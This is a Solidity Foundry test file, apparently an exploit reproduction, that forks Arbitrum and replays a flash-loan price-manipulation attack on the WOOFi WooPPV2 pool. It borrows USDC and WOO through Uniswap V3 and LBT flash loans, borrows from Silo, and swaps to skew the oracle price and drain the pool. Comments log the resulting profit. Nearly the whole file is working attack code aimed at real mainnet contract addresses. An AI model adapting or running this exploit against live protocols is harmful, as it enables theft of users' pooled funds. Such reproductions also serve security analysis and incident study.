// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";
import "@interface/IUniswapV3.sol";

import "./IWooPPV2.sol";
import "./ISilo.sol";
import "./IWooracleV2.sol";
import "./ILbt.sol";

IERC20 constant WOO = IERC20(0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b);
IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
IERC20 constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

IWooPPV2 constant wooPPV2 = IWooPPV2(
    0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062
);
ISilo constant Silo = ISilo(0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F);

// WETH / USDC
IUniswapV3Pool constant WETH_USDC_Pool = IUniswapV3Pool(
    0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443
);

// Woo / WETH
ILBTFlashloan constant LBT = ILBTFlashloan(
    0xB87495219C432fc85161e4283DfF131692A528BD
);

WooracleV2_1_ZipInherit constant WooracleV2 = WooracleV2_1_ZipInherit(
    0x73504eaCB100c7576146618DC306c97454CB3620
);

contract WoofiTest is Test {
    uint256 USDCLoanAmount;
    uint256 WooLoanAmount;

    function setUp() public {
        vm.createSelectFork("arb_one", 187381784);
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(WOO), "WOO");
        vm.label(address(LBT), "LBT");
        vm.label(address(WooracleV2), "WooracleV2");
        vm.label(address(Silo), "Silo");
        vm.label(address(WETH_USDC_Pool), "WETH_USDC_Pool");
        vm.label(address(wooPPV2), "wooPPV2");
        vm.label(address(this), "Attacker");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        WOO.approve(address(wooPPV2), type(uint256).max);
        WOO.approve(address(Silo), type(uint256).max);
        USDC.approve(address(wooPPV2), type(uint256).max);
        USDC.approve(address(Silo), type(uint256).max);

        // USDC.balanceOf(address(WETH_USDC_Pool))
        // print("Pool's USDC", USDC.balanceOf(address(WETH_USDC_Pool)), 6);
        // Pool's USDC: 10586446.576012

        USDCLoanAmount = USDC.balanceOf(address(WETH_USDC_Pool)) - 10000 * 1e6;
        WETH_USDC_Pool.flash(address(this), 0, USDCLoanAmount, new bytes(1));

        print("USDC after", USDC.balanceOf(address(this)), 6);
        print("WOO after", WOO.balanceOf(address(this)), 18);
        print("WETH after", WETH.balanceOf(address(this)), 18);
        // USDC after: 141603.536376
        // WOO after: 2549710.367944099228835575
        // WETH after: 522.295261244159469020
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee0;
        data;

        // uint256 lbtAmount = WOO.balanceOf(address(LBT));
        // print("PoolWooAmount", lbtAmount, 18);
        // PoolWooAmount: 2704558.014737261187877837

        WooLoanAmount = WOO.balanceOf(address(LBT)) - 100;
        // print("WooLoanAmount", WooLoanAmount, 18);
        // WooLoanAmount: 2704558.014737261187877737

        LBT.flashLoan(
            ILBFlashLoanCallback(address(this)),
            bytes32(WooLoanAmount),
            abi.encodePacked(bytes32(WooLoanAmount), bytes32(0))
        );

        // deal(address(USDC), address(this), USDCLoanAmount + fee1);
        USDC.transfer(address(WETH_USDC_Pool), USDCLoanAmount + fee1);
    }

    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        bytes32 totalFees,
        bytes calldata data
    ) external returns (bytes32) {
        sender;
        tokenX;
        tokenY;
        amounts;
        data;

        Silo.deposit(
            address(USDC), // _asset
            7000000 * 1e6, // _amount
            true // _collateralOnly
        );
        Silo.borrow(address(WOO), Silo.liquidity(address(WOO)));
        USDC.transfer(address(wooPPV2), 2000000000000);
        wooPPV2.swap(
            address(USDC),
            address(WETH),
            2000000000000,
            0,
            address(this),
            address(this)
        );
        WooracleV2.state(address(WOO));
        USDC.transfer(address(wooPPV2), 100000000000);
        wooPPV2.swap(
            address(USDC),
            address(WOO),
            100000000000,
            0,
            address(this),
            address(this)
        );
        WooracleV2.state(address(WOO));
        // uint256 woo_amount_after = WOO.balanceOf(address(this));
        uint256 woo_amount_swap = 7856868800000000000000000;
        // adjusted value, otherwise overflow in price calculation
        WOO.transfer(address(wooPPV2), woo_amount_swap);
        wooPPV2.swap(
            address(WOO),
            address(USDC),
            woo_amount_swap,
            0,
            address(this),
            address(this)
        );
        WooracleV2.state(address(WOO));
        wooPPV2.poolSize(address(WOO));

        USDC.balanceOf(address(this));
        uint256 usdc_amount_drain = 926342;
        // another ajusted value to reflect the pool size

        USDC.transfer(address(wooPPV2), usdc_amount_drain);
        wooPPV2.swap(
            address(USDC),
            address(WOO),
            usdc_amount_drain,
            0,
            address(this),
            address(this)
        );

        Silo.repay(address(WOO), type(uint256).max);
        Silo.withdraw(address(USDC), type(uint256).max, true);

        uint256 totalFees_ = uint256(totalFees);
        WOO.transfer(address(LBT), WooLoanAmount + totalFees_ + 10000);
        return keccak256("LBPair.onFlashLoan");
    }

    receive() external payable {}
}
